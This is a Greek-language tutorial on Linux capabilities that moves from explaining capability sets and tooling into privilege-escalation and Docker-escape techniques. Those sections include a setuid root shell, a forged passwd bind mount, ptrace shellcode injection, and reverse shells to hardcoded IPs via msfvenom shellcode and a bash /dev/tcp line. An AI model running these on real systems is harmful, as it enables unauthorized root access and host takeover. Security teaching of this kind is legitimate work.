# Linux Capabilities

Τα Linux capabilities διαχωρίζουν τα **root privileges σε μικρότερες, διακριτές μονάδες**, επιτρέποντας στις διεργασίες να διαθέτουν υποσύνολο προνομίων. Αυτό ελαχιστοποιεί τους κινδύνους, καθώς δεν εκχωρούνται πλήρη root privileges χωρίς να είναι απαραίτητο.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Το πρόβλημα:

- Οι κανονικοί χρήστες έχουν περιορισμένα δικαιώματα για λειτουργίες όπως το άνοιγμα raw sockets ή το binding σε Internet ports κάτω από το 1024· τα capabilities μπορούν να εκχωρήσουν μόνο την απαιτούμενη λειτουργία αντί για πλήρες root privilege.<sup>[[14]](#references)</sup>

### Capability Sets:

Το Linux εκθέτει αυτά τα capability sets ανά thread και ο kernel εφαρμόζει τους περιορισμούς τους όταν μια διεργασία αλλάζει credentials ή εκτελεί ένα αρχείο.<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

- **Σκοπός**: Προσδιορίζει τα capabilities που μπορούν να συνεισφέρουν στο permitted set μετά το `execve()`, όταν το εκτελούμενο αρχείο διαθέτει αντίστοιχα inheritable file capabilities.
- **Λειτουργικότητα**: Το inheritable set του thread διατηρείται κατά τη διάρκεια του `execve()`· από μόνο του δεν καθιστά αυτά τα capabilities effective.
- **Περιορισμοί**: Η προσθήκη ενός capability σε αυτό το set περιορίζεται από τα permitted και bounding sets.<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

- **Σκοπός**: Αναπαριστά τα πραγματικά capabilities που χρησιμοποιεί μια διεργασία ανά πάσα στιγμή.
- **Λειτουργικότητα**: Είναι το set των capabilities που ελέγχει ο kernel για να εκχωρήσει permission σε διάφορες λειτουργίες. Για τα αρχεία, αυτό το set μπορεί να είναι ένα flag που υποδεικνύει αν τα permitted capabilities του αρχείου θα θεωρούνται effective.
- **Σημασία**: Το effective set είναι κρίσιμο για τους άμεσους privilege checks, λειτουργώντας ως το ενεργό set των capabilities που μπορεί να χρησιμοποιήσει μια διεργασία.

3. **Permitted (CapPrm)**:

- **Σκοπός**: Καθορίζει το μέγιστο set των capabilities που μπορεί να διαθέτει μια διεργασία.
- **Λειτουργικότητα**: Μια διεργασία μπορεί να μεταφέρει ένα capability από το permitted set στο effective set, αποκτώντας τη δυνατότητα να το χρησιμοποιήσει. Μπορεί επίσης να αφαιρέσει capabilities από το permitted set.
- **Όριο**: Αν ένα capability αφαιρεθεί από αυτό το set, κανονικά δεν μπορεί να αποκατασταθεί χωρίς την εκτέλεση ενός αρχείου που το εκχωρεί ή χωρίς άλλη privileged transition.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

- **Σκοπός**: Περιορίζει τα capabilities που μπορεί να αποκτήσει μια διεργασία από ένα αρχείο κατά το `execve()` και εκείνα που μπορεί να προσθέσει στο inheritable set της.
- **Λειτουργικότητα**: Το set κληρονομείται κατά το `fork()` και διατηρείται κατά το `execve()`· capabilities μπορούν να αφαιρεθούν από αυτό όταν ο caller διαθέτει `CAP_SETPCAP`.
- **Use-case**: Η αφαίρεση περιττών capabilities από αυτό το set περιορίζει τη μεταγενέστερη απόκτηση privileges.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
- **Σκοπός**: Επιτρέπει σε επιλεγμένα capabilities να παραμένουν permitted και effective κατά το `execve()` ενός nonprivileged προγράμματος.
- **Λειτουργικότητα**: Τα ambient capabilities προστίθενται στα νέα permitted και effective sets όταν το εκτελούμενο αρχείο δεν είναι privileged.
- **Περιορισμοί**: Ένα capability μπορεί να είναι ambient μόνο όσο υπάρχει τόσο στα permitted όσο και στα inheritable sets· η εκτέλεση ενός set-user-ID/set-group-ID αρχείου ή ενός αρχείου με capabilities εκκαθαρίζει το ambient set.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Capabilities διεργασιών και Binaries

### Capabilities διεργασιών

Για να δείτε τα capabilities μιας συγκεκριμένης διεργασίας, χρησιμοποιήστε το αρχείο **status** στον κατάλογο /proc. Καθώς παρέχει περισσότερες λεπτομέρειες, ας περιοριστούμε μόνο στις πληροφορίες που σχετίζονται με τα Linux capabilities.\
Σημειώστε ότι για όλες τις εκτελούμενες διεργασίες, οι πληροφορίες capabilities διατηρούνται ανά thread, ενώ τα file capabilities αποθηκεύονται σε extended attributes `security.capability`.<sup>[[14]](#references)[[15]](#references)</sup>

Μπορείτε να βρείτε τα capabilities που ορίζονται στο /usr/include/linux/capability.h

Μπορείτε να βρείτε τα capabilities της τρέχουσας διεργασίας με `cat /proc/self/status` ή με `capsh --print`, και εκείνα άλλων διεργασιών στο `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Αυτή η εντολή θα πρέπει να επιστρέφει πέντε γραμμές capabilities στα περισσότερα συστήματα.<sup>[[15]](#references)</sup>

- CapInh = Inherited capabilities
- CapPrm = Permitted capabilities
- CapEff = Effective capabilities
- CapBnd = Bounding set
- CapAmb = Ambient capabilities set
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Αυτοί οι δεκαεξαδικοί αριθμοί δεν βγάζουν νόημα. Χρησιμοποιώντας το utility `capsh`, μπορούμε να τους αποκωδικοποιήσουμε σε ονόματα capabilities.<sup>[[26]](#references)</sup>
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Ας ελέγξουμε τώρα τα **capabilities** που χρησιμοποιεί το `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Παρόλο που αυτό λειτουργεί, υπάρχει ένας άλλος και ευκολότερος τρόπος. Για να δείτε τις capabilities μιας εκτελούμενης διεργασίας, χρησιμοποιήστε το εργαλείο **getpcaps** ακολουθούμενο από το process ID (PID) της· δέχεται επίσης μια λίστα από process IDs.<sup>[[22]](#references)</sup>
```bash
getpcaps 1234
```
Ας ελέγξουμε τις capabilities του `tcpdump` αφού δώσουμε στο binary τα `cap_net_admin` και `cap_net_raw` για να κάνει sniffing στο δίκτυο (`tcpdump` εκτελείται στη διεργασία 9562).<sup>[[22]](#references)[[25]](#references)</sup>
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Όπως μπορείτε να δείτε, οι capabilities αντιστοιχούν στα αποτελέσματα των δύο τρόπων επιθεώρησης μιας διεργασίας. Το εργαλείο `getpcaps` χρησιμοποιεί το libcap για να υποβάλει ερώτημα σχετικά με τις capabilities μιας διεργασίας-στόχου και τις εκτυπώνει σε μορφή κειμένου· δέχεται ένα ή περισσότερα PIDs.<sup>[[22]](#references)</sup>

### Capabilities Binaries

Τα Binaries μπορούν να διαθέτουν file capabilities που εφαρμόζονται κατά την εκτέλεση. Για παράδειγμα, ένα binary του `ping` μπορεί να διαθέτει την capability `cap_net_raw`.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Μπορείτε να **αναζητήσετε binaries με capabilities** χρησιμοποιώντας το `getcap -r`.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Dropping capabilities with capsh

Αν αφαιρέσουμε το `CAP_NET_RAW` από το τρέχον bounding set, ένα πρόγραμμα που χρειάζεται αυτήν τη capability δεν θα πρέπει πλέον να μπορεί να τη χρησιμοποιεί.<sup>[[26]](#references)</sup>
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Εκτός από την έξοδο του ίδιου του _capsh_, και η ίδια η εντολή _tcpdump_ θα πρέπει επίσης να εμφανίσει σφάλμα.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Το σφάλμα δείχνει ότι το `tcpdump` δεν μπορεί να εκτελεστεί με την απαιτούμενη capability αρχείου, αφού η `CAP_NET_RAW` αφαιρέθηκε από το bounding set.

### Αφαίρεση Capabilities

Μπορείτε να αφαιρέσετε τις capabilities ενός αρχείου με το `setcap -r`.<sup>[[25]](#references)</sup>
```bash
setcap -r </path/to/binary>
```
## User Capabilities

Το Linux δεν εκχωρεί capabilities αρχείων απευθείας σε έναν χρήστη σύνδεσης, αλλά το PAM module `pam_cap` μπορεί να ορίσει inheritable capabilities για authenticated sessions χρησιμοποιώντας το `/etc/security/capability.conf`.<sup>[[16]](#references)</sup> Κάθε καταχώριση αντιστοιχίζει ονόματα ή αριθμούς capabilities, διαχωρισμένα με κόμματα, σε ένα ή περισσότερα usernames.<sup>[[17]](#references)</sup>
Παράδειγμα αρχείου:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Δυνατότητες Περιβάλλοντος

Η μεταγλώττιση του ακόλουθου προγράμματος καθιστά δυνατή την **εκκίνηση ενός bash shell μέσα σε ένα περιβάλλον που παρέχει capabilities**.<sup>[[14]](#references)</sup>
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Μέσα στο **bash που εκτελείται από το μεταγλωττισμένο ambient binary**, είναι δυνατό να παρατηρηθούν οι **νέες capabilities** (ένας κανονικός χρήστης δεν θα έχει καμία capability στην ενότητα "current").<sup>[[14]](#references)</sup>
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Μπορείτε να **προσθέσετε μόνο capabilities που υπάρχουν** τόσο στα permitted όσο και στα inheritable sets.<sup>[[14]](#references)</sup>

### Binaries με επίγνωση capabilities/Capability-dumb binaries

Ένα capability-dumb binary είναι ένα πρόγραμμα με file capabilities που δεν χρησιμοποιεί το libcap για τη διαχείρισή τους. Αν έχει οριστεί το file effective bit, ο kernel ενεργοποιεί τα permitted capabilities του αρχείου στο effective set της διεργασίας· η εκτέλεση μπορεί να αποτύχει αν η διεργασία δεν απέκτησε όλα τα permitted capabilities.<sup>[[14]](#references)</sup>

## Capabilities υπηρεσιών

Μια system service που εκτελείται ως root μπορεί να διατηρεί ευρεία capabilities, εκτός αν το περιβάλλον εκτέλεσής της τις περιορίζει. Σε μια μονάδα systemd, το `User=` επιλέγει τον χρήστη της υπηρεσίας και το `AmbientCapabilities=` προσθέτει τις καθορισμένες capabilities στο ambient set της διεργασίας που εκτελείται.<sup>[[18]](#references)</sup>
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities σε Docker Containers

Το Docker εκκινεί containers με ένα προεπιλεγμένο σύνολο capabilities, το οποίο μπορεί να αλλάξει με τα `--cap-add` και `--cap-drop`. Ένα container μπορεί να ελεγχθεί με το `amicontained`.<sup>[[19]](#references)[[24]](#references)</sup>
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Τα capabilities είναι χρήσιμα όταν **θέλετε να περιορίσετε τις δικές σας διεργασίες μετά την εκτέλεση προνομιούχων λειτουργιών** (π.χ. μετά τη ρύθμιση του chroot και τη σύνδεση σε ένα socket). Ωστόσο, μπορούν να γίνουν αντικείμενο εκμετάλλευσης με την παράδοση κακόβουλων εντολών ή arguments, οι οποίες στη συνέχεια εκτελούνται ως root.<sup>[[2]](#references)</sup>

Μπορείτε να επιβάλετε file capabilities σε προγράμματα με το `setcap` και να τις αναζητήσετε με το `getcap`.<sup>[[23]](#references)[[25]](#references)</sup>
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
Στη σύνταξη file-capability, το `+ep` αυξάνει την ονομασμένη capability στα effective και permitted sets, ενώ το `-` μειώνει τα επιλεγμένα flags.<sup>[[21]](#references)</sup>

Για τον εντοπισμό προγραμμάτων σε ένα σύστημα ή φάκελο που διαθέτουν capabilities, χρησιμοποιήστε το `getcap -r`.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Παράδειγμα exploitation

Στο ακόλουθο παράδειγμα, το binary `/usr/bin/python2.6` εντοπίζεται ως ευάλωτο σε privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
Απαιτούνται **Capabilities** από το `tcpdump` για να **επιτρέπεται σε οποιονδήποτε χρήστη να κάνει sniffing πακέτων**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Η ειδική περίπτωση των "empty" capabilities

Ένα αρχείο μπορεί να περιέχει ένα κενό σύνολο capabilities (`getcap myelf` επιστρέφει `myelf =ep`). Ένα κενό σύνολο δεν παρέχει capabilities· όταν συνδυάζεται με ένα root-owned set-user-ID bit, το πρόγραμμα μπορεί και πάλι να αλλάξει τα effective και saved IDs της εκτελούμενης διεργασίας σε 0, χωρίς να αποκτήσει file capabilities. Ένα unowned αρχείο χωρίς SUID/SGID με `=ep` δεν εκτελείται ως root.<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

Το **[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** είναι ένα ιδιαίτερα ισχυρό Linux capability, το οποίο συχνά εξισώνεται με σχεδόν root επίπεδο λόγω των εκτεταμένων **administrative privileges** του, όπως η προσάρτηση συσκευών ή ο χειρισμός χαρακτηριστικών του kernel. Παρότι είναι απαραίτητο για containers που προσομοιώνουν ολόκληρα συστήματα, το **`CAP_SYS_ADMIN` δημιουργεί σημαντικές προκλήσεις ασφάλειας**, ειδικά σε containerized περιβάλλοντα, λόγω της πιθανότητας privilege escalation και compromise του συστήματος. Επομένως, η χρήση του απαιτεί αυστηρές αξιολογήσεις ασφάλειας και προσεκτική διαχείριση, με ισχυρή προτίμηση στην αφαίρεση αυτού του capability από application-specific containers, ώστε να τηρείται η **principle of least privilege** και να ελαχιστοποιείται το attack surface.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Χρησιμοποιώντας την Python, μπορείτε να προσαρτήσετε ένα τροποποιημένο αρχείο _passwd_ πάνω από το πραγματικό αρχείο _passwd_:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Και τέλος, κάντε **mount** το τροποποιημένο αρχείο `passwd` στο `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Και θα μπορείτε να κάνετε **`su` ως root** χρησιμοποιώντας τον κωδικό πρόσβασης "password".

**Παράδειγμα με environment (Docker breakout)**

Μπορείτε να ελέγξετε τα ενεργοποιημένα capabilities μέσα στο docker container χρησιμοποιώντας:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Στο προηγούμενο output μπορείτε να δείτε ότι η capability SYS_ADMIN είναι ενεργοποιημένη.<sup>[[14]](#references)</sup>

- **Mount**

Με κατάλληλη πρόσβαση σε device και namespace, αυτό μπορεί να επιτρέψει σε ένα Docker container να **κάνει mount έναν δίσκο του host και να αποκτήσει πρόσβαση στα περιεχόμενά του**.<sup>[[14]](#references)</sup>
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Πλήρης πρόσβαση**

Στην προηγούμενη μέθοδο καταφέραμε να αποκτήσουμε πρόσβαση σε έναν δίσκο του host.\
Εάν ο host εκτελεί έναν server **ssh**, θα μπορούσατε να **δημιουργήσετε έναν χρήστη μέσα στον προσαρτημένο δίσκο** και να αποκτήσετε πρόσβαση μέσω SSH.<sup>[[14]](#references)</sup>
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

Με το `CAP_SYS_PTRACE`, μια διεργασία μπορεί να κάνει trace και να επιθεωρεί άλλες διεργασίες που είναι ορατές στο PID namespace της. Για τη στόχευση διεργασιών του host από ένα Docker container, κάντε share το host PID namespace με `--pid=host` (ή κάντε join σε ένα namespace που περιέχει τον στόχο).<sup>[[14]](#references)[[20]](#references)</sup>

Το **[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** παρέχει τη δυνατότητα χρήσης λειτουργιών debugging και system call tracing που παρέχονται από το `ptrace(2)`, καθώς και cross-memory attach calls όπως τα `process_vm_readv(2)` και `process_vm_writev(2)`. Παρότι είναι ισχυρό για σκοπούς διάγνωσης και monitoring, αν το `CAP_SYS_PTRACE` είναι ενεργοποιημένο χωρίς περιοριστικά μέτρα, όπως ένα seccomp filter στο `ptrace(2)`, μπορεί να υπονομεύσει σημαντικά την ασφάλεια του συστήματος. Συγκεκριμένα, μπορεί να γίνει exploit για την παράκαμψη άλλων περιορισμών ασφαλείας, ιδίως αυτών που επιβάλλονται από το seccomp, όπως αποδεικνύεται από [proofs of concept (PoC) όπως αυτό](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>

**Παράδειγμα με binary (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Παράδειγμα με binary (gdb)**

`gdb` με δυνατότητα `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Δημιουργήστε shellcode με το msfvenom για injection στη μνήμη μέσω του gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Κάντε debug σε μια διεργασία root με το gdb και κάντε copy-paste τις γραμμές gdb που δημιουργήθηκαν προηγουμένως:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Παράδειγμα με environment (Docker breakout) - Another gdb Abuse**

Αν είναι εγκατεστημένο το **GDB** (ή μπορείτε να το εγκαταστήσετε με `apk add gdb` ή `apt install gdb`, για παράδειγμα), μπορείτε να κάνετε **debug σε μια διεργασία από το host** και να την κάνετε να καλέσει τη συνάρτηση `system`. (Αυτή η τεχνική απαιτεί επίσης το capability `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
